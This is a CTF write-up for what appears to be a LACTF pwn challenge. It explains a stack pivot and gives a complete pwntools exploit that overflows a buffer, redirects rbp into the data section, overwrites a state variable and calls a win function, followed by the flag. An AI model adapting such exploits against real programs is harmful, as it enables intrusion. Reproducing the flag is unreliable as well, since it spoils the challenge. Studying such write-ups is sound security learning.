Solved by: @w6rstaimn

### Question:
Changes in state are like rustlings in the wind
### Solution:
1. pivot to the data section then overwrite the state variable and call the win function
2. overwrites the saved rbp with new_rbp = state_addr + 15 overwrites the return address with vuln()+8 
3. when leave executes, rsp=rbp 
4. second fgets() will write data into state_addr + 15 addr pad 16 bytes, overwrite state, pad more, call win func

```python
from pwn import *
import time

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], int(sys.argv[2]), *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+8
continue
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe,checksec=True)
context.log_level = 'debug'

io = start()

offset  = 32


state_addr = elf.symbols['state']
vuln_addr   = elf.symbols['vuln']     
win_addr    = elf.symbols['win']       

log.info("state address: " + hex(state_addr))
log.info("vuln address:  " + hex(vuln_addr))
log.info("win address:   " + hex(win_addr))

new_rbp = state_addr + 15
vuln_plus8 = vuln_addr + 8
new_state = 0xf1eeee2d
log.info("new_rbp: " + hex(new_rbp))
log.info("vuln_plus8:  " + hex(vuln_plus8))

payload = flat([
    b"A" * 32,
    p64(new_rbp),
    p64(vuln_plus8)
])


io.recvuntil(b'you?')
io.send(payload)

payload2 = flat([
    p64(0x1)*2, 
    p32(new_state),
    p8(0x2)*(19),
    p64(win_addr)
])

io.sendlineafter(b'?',payload2)

print(io.recv())
io.interactive()
```

**Flag:**`lactf{1s_tHi5_y0Ur_1St_3vER_p1VooT}`

